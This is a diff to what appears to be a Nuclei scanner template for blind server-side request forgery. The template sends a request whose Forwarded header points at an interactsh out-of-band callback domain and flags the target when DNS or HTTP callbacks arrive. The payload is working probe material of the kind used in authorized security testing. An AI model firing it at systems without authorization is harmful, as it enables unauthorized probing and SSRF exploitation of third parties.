@@ -1,16 +1,17 @@
-id: 0x066
+id: blind-ssrf-066
 
 info:
   name: Blind SSRF
-  author: 0xAwali
-  severity: info
+  author: reewardius
+  severity: high
+  tags: ssrf
 
-requests:
+http:
   - raw:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
-        Forwarded: for={{Host}}.{{Port}}.BSSRF-066.{{MY-DOMAIN}}/.{{Hostname}};by={{Host}}.{{Port}}.BSSRF-066.{{MY-DOMAIN}}/.{{Hostname}};host={{Host}}.{{Port}}.BSSRF-066.{{MY-DOMAIN}}/.{{Hostname}}
+        Forwarded: for={{Host}}.{{Port}}.BSSRF-066.{{interactsh-url}}/.{{Hostname}};by={{Host}}.{{Port}}.BSSRF-066.{{interactsh-url}}/.{{Hostname}};host={{Host}}.{{Port}}.BSSRF-066.{{interactsh-url}}/.{{Hostname}}
         User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
         Cache-Control: no-transform
         Accept-Encoding: gzip, deflate
@@ -18,6 +19,8 @@ requests:
 
     matchers:
       - type: word
-        part: body
+        part: interactsh_protocol
         words:
-          - "Your Match"
+          - "dns"
+          - "http"
+        condition: or
